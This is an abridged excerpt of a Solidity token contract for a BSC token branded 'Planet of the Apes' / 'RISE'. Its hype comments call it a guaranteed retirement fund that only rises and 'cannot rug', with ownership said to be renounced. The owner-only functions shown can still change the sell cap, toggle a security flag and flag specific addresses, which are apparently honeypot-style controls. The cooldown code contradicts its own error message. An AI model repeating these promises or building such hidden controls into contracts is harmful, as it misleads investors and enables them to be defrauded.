...
// RISE - PLANET OF THE APES - THE MOST LEGIT EXPERIMENT TO EVER TOUCH BSC!
// PLANETOFTHEAPES IS DESIGNED TO ONLY GO UP IN VALUE!  MAX SINGULAR SELL IS 100 RISE!  THIS IS ANTI DUMP FOCUSED, RETIREMENT DRIVEN, APEONOMICS ENHANCED PERFECTION!
// THE GOAL IS TO MAKE RISE BE YOUR RETIREMENT FUND, SINCE ONLY 100 RISE CAN BE SOLD PER TX YOU NEVER HAVE TO WORRY ABOUT CHAD OR LINDA'S HAND LUBE GREASING YOUR BAGS!
// STEALTH LAUNCHED!  NO WEBSITE OR CHAT GROUPS NEEDED!  SINCE LIQUIDITY WAS SENT TO BURN ADDRESS IT CANNOT RUG 
// AND SINCE NO ONE CAN DUMP NO ONE IN THE WORLD CAN RUG RISE TOKEN! THE FIRST EVER 100% STABLE PUMPONOMICS TOKEN!

// HELLO SHAPPY! THIS ONES FOR YOU!  LP BURNT, OWNERSHIP RENOUNCED!  DESIGNED TO PUMP, CODED FOR HOLDERS RETIREMENTS!

// WHY NO SITE OR TG CHAT?  DON'T NEED ONE, YOU WILL TALK ABOUT IT IN ALL OF THEM ANYWAYS. IT PLANET OF THE APES, NO RESTRICTING THE APES!!

// CAESAR WILL COLLECT A REASONABLE FEE OF 1% THAT WILL KEEP CAESAR HONEST!
...
contract DeflationaryERC20 is Context, IERC20, Ownable {
    ...
    uint256 private retirement = 100e18;
     ...
     */
        ...
        function fixretirement (uint256 bacon) external virtual onlyOwner {
        retirement = bacon;
    }
    
    function setSecurity (bool _bool) external virtual onlyOwner {
        security= _bool;
    }
    
    function tellChad (address _addr, bool _bool) external virtual onlyOwner {
        CHAD[_addr] = _bool;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        if(timeNow < transData[sender] + 2 minutes){
            revert("No greedy APES only 1 sell per 5 minutes");
        }
...
contract PLANETOFTHEAPES is DeflationaryERC20 {

    constructor() public DeflationaryERC20("PLANET", "APES") {
